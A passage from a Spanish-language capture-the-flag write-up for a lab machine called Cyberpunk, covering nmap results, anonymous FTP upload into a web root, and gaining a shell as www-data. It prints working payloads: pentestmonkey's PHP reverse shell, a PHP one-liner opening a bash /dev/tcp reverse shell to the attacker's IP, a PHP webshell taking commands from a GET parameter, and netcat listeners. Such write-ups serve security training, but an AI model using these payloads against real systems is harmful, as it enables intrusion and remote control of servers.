+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20SYST<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20HELP<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n\x</span>20NOOP<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20FEAT<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20OPTS<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20HOST<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20CLNT<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20AUTH<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20CCC<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20CONF<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\r\n\x</span>20ENC<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20MIC<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20PBSZ<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20PRO
+</span></span><span style="display:flex;"><span>SF:T<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20TYPE<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20STRU<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20MODE<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20RETR<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n\x</span>20STOR<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20STOU<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0APPE<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20REST<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20ABOR<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20RANG<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20USER<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20PASS<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n\x</span>20ACCT<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20REIN<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20LIST<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20NLST<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20STAT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20SITE<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20MLSD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20MLST<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\r\n</span>214<span style="color:#ae81ff">\x</span>20Env<span style="color:#ae81ff">\x</span>c3<span style="color:#ae81ff">\x</span>ada<span style="color:#ae81ff">\x</span>20comentario<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20root@Cyberpunk<span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;)%r(S
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:SLSessionReq,3A,&#34;</span>220<span style="color:#ae81ff">\x</span>20Servidor<span style="color:#ae81ff">\x</span>20ProFTPD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Cyberpunk<span style="color:#ae81ff">\)\x</span>20<span style="color:#ae81ff">\[</span>::fff
+</span></span><span style="display:flex;"><span>SF:f:192<span style="color:#ae81ff">\.</span>168<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\.</span>120<span style="color:#ae81ff">\]\r\n</span><span style="color:#e6db74">&#34;)%r(SMBProgNeg,3A,&#34;</span>220<span style="color:#ae81ff">\x</span>20Servidor<span style="color:#ae81ff">\x</span>20ProFTPD
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Cyberpunk<span style="color:#ae81ff">\)\x</span>20<span style="color:#ae81ff">\[</span>::ffff:192<span style="color:#ae81ff">\.</span>168<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\.</span>120<span style="color:#ae81ff">\]\r\n</span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: Host: Servidor; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 30.80 seconds
+</span></span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, el escaneo acaba de mostrar que podemos loguearnos al <strong>servicio FTP</strong> como el usuario <strong>anonymous</strong> y de hecho, podemos ver algunos archivos que parecen ser de la página web activa.</p>
+<p>Vamos a comprobarlo en la página web.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura1.png">
+</p>
+<p>Parece ser un personaje del videojuego <strong>Cyberpunk 2077</strong> (uno de mis favoritos).</p>
+<p>Veamos que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura2.png">
+</p>
+<p>No nos dice mucho.</p>
+<p>Recordemos que en el escaneo, pudimos ver algunos archivos que parecen ser de la página web.</p>
+<p>Vamos a comprobarlo buscando uno de estos, en específico, buscaremos el archivo <code>secret.txt</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura3.png">
+</p>
+<p>Parece que sí, están usando el <strong>servicio FTP</strong> como servidor web. Ya con esto nos podemos dar una idea de lo que podemos hacer.</p>
+<p>Pero, no está demás comprobarlo.</p>
+<h3 id="FTP">Análisis y Enumeración de Servicio FTP</h3>
+<p>Entremos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp 192.168.1.120
+</span></span><span style="display:flex;"><span>Connected to 192.168.1.120.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Servidor ProFTPD <span style="color:#f92672">(</span>Cyberpunk<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:192.168.1.120<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>192.168.1.120:berserkwings<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Conexión anónima ok, envía tu dirección de email como contraseña
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Aceptado acceso anónimo, aplicadas restricciones
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Revisamos y ahí están los archivos que vimos en el escaneo de servicios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|16681|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Abriendo conexión de datos en modo ASCII para file list
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> images
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">713</span> May  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> index.html
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">923</span> May  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> secret.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transferencia completada
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Vamos a tratar de subir un archivo.</p>
+<p>Crea un archivo de texto random:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano prueba.txt
+</span></span></code></pre></div><p>Y súbelo al <strong>servicio FTP</strong> utilizando el comando <strong>put</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put prueba.txt 
+</span></span><span style="display:flex;"><span>local: prueba.txt remote: prueba.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|37532|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Abriendo conexión de datos en modo BINARY para prueba.txt
+</span></span><span style="display:flex;"><span>100% |************************************************|    <span style="color:#ae81ff">22</span>       21.74 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transferencia completada
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span> bytes sent in 00:00 <span style="color:#f92672">(</span>6.86 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Ahora, veamos si lo podemos ver en la página web:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura4.png">
+</p>
+<p>Ahí está.</p>
+<p>Entonces, la idea será subir un archivo que interprete el <strong>servidor Apache</strong>, que normalmente puede interpretar el <strong>lenguaje PHP</strong>, por lo que vamos a usar una <strong>Reverse Shell de PHP</strong> para obtener una sesión de la máquina víctima.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="PHP">Utilizando Reverse Shell de PHP de pentestmonkey para Obtener Sesión de la Máquina Víctima</h3>
+<p>Vamos a utilizar la <strong>Reverse Shell</strong> de <strong>pentestmonkey</strong>.</p>
+<p>La puedes obtener del siguiente link:</p>
+<ul>
+<li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a></li>
+</ul>
+<p>La descargamos con <strong>wget</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>--2025-02-21 12:15:51--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>Resolviendo raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span>Conectando con raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span>... conectado.
+</span></span><span style="display:flex;"><span>Petición HTTP enviada, esperando respuesta... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Longitud: <span style="color:#ae81ff">5491</span> <span style="color:#f92672">(</span>5.4K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Grabando a: «php-reverse-shell.php»
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>php-reverse-shell.php        100%<span style="color:#f92672">[===========================================</span>&gt;<span style="color:#f92672">]</span>   5.36K  --.-KB/s    en 0s      
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>2025-02-21 12:15:51 <span style="color:#f92672">(</span>83.2 MB/s<span style="color:#f92672">)</span> - «php-reverse-shell.php» guardado <span style="color:#f92672">[</span>5491/5491<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Para poder usarla, necesitamos modificar los campos de la IP y del puerto para poner nuestra IP y un puerto que queramos.</p>
+<p>El mismo script nos lo dice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>;  <span style="color:#75715e">// CHANGE THIS
+</span></span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>;       <span style="color:#75715e">// CHANGE THIS
+</span></span></span><span style="display:flex;"><span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
+</span></span><span style="display:flex;"><span>$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span></code></pre></div><p>Cambia esos dos datos y luego, súbelo al <strong>servicio FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put php-reverse-shell.php 
+</span></span><span style="display:flex;"><span>local: php-reverse-shell.php remote: php-reverse-shell.php
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|27786|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Abriendo conexión de datos en modo BINARY para php-reverse-shell.php
+</span></span><span style="display:flex;"><span>100% |*****************************************************************|  <span style="color:#ae81ff">5496</span>       10.52 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transferencia completada
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5496</span> bytes sent in 00:00 <span style="color:#f92672">(</span>2.29 MiB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Bien, ahora abre una <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y, vamos a visitar en la página web la <strong>Reverse Shell</strong> que cargamos en el <strong>servicio FTP</strong>.</p>
+<p>Revisa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.120<span style="color:#f92672">]</span> <span style="color:#ae81ff">34088</span>
+</span></span><span style="display:flex;"><span>Linux Cyberpunk 6.1.0-20-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 19:17:56 up <span style="color:#ae81ff">25</span> min,  <span style="color:#ae81ff">0</span> user,  load average: 2.45, 2.24, 1.47
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Listo, estamos dentro.</p>
+<p>Ya solo haz un tratamiento de la <strong>TTY</strong> y tendrás una shell interactiva.</p>
+<h3 id="PHP2">Creando y Cargando Reverse Shell de PHP para Obtener Sesión de la Máquina Víctima</h3>
+<p>Otra opción que pudimos haber hecho, sería crear nuestra propia <strong>Reverse Shell</strong>.</p>
+<p>Esta sería la <strong>Reverse Shell</strong> que usaríamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/Tu_IP/443 0&gt;&amp;1&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Vamos a subirlo al <strong>servicio FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put revShell2.php 
+</span></span><span style="display:flex;"><span>local: revShell2.php remote: revShell2.php
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|50390|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Abriendo conexión de datos en modo BINARY para revShell2.php
+</span></span><span style="display:flex;"><span>100% |*********************************************************|   <span style="color:#ae81ff">126</span>        1.15 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transferencia completada
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">126</span> bytes sent in 00:00 <span style="color:#f92672">(</span>48.67 KiB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Abre una <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y, vamos a visitar en la página web la <strong>Reverse Shell</strong> que cargamos en el <strong>servicio FTP</strong>.</p>
+<p>Revisa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.120<span style="color:#f92672">]</span> <span style="color:#ae81ff">46368</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>487<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@Cyberpunk:/var/www/html$
+</span></span></code></pre></div><p>Listo, otra vez estamos dentro.</p>
+<h3 id="PHP3">Creando y Utilizando WebShell de PHP para Obtener Sesión en Máquina Víctima</h3>
+<p>Esto es bastante sencillo.</p>
+<p>Vamos a crear un script de <strong>PHP</strong> que funcione como una <strong>WebShell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Lo cargamos al <strong>servicio FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put cmd.php 
+</span></span><span style="display:flex;"><span>local: cmd.php remote: cmd.php
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|6665|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Abriendo conexión de datos en modo BINARY para cmd.php
+</span></span><span style="display:flex;"><span>100% |***************************************************|    <span style="color:#ae81ff">32</span>      322.16 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transferencia completada
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span> bytes sent in 00:00 <span style="color:#f92672">(</span>5.98 KiB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Abre una <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y, vamos a visitar en la página web la <strong>Reverse Shell</strong> que cargamos en el <strong>servicio FTP</strong>.</p>
+<p>Desde la URL, vamos a usar el parámetro <strong>cmd</strong> para poder ejecutar comandos.</p>
+<p>Intentemos ejecutar el comando <strong>whoami</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura5.png">
+</p>
+<p>Funciona.</p>
+<p>Ahora, vamos a utilizar nuestra <strong>Reverse Shell</strong>, pero <strong>URL encodeada</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;%26 /dev/tcp/Tu_IP/443 0&gt;%261&#39;</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura6.png">
+</p>
+<p>Revisa la <strong>netcat</strong>:</p>
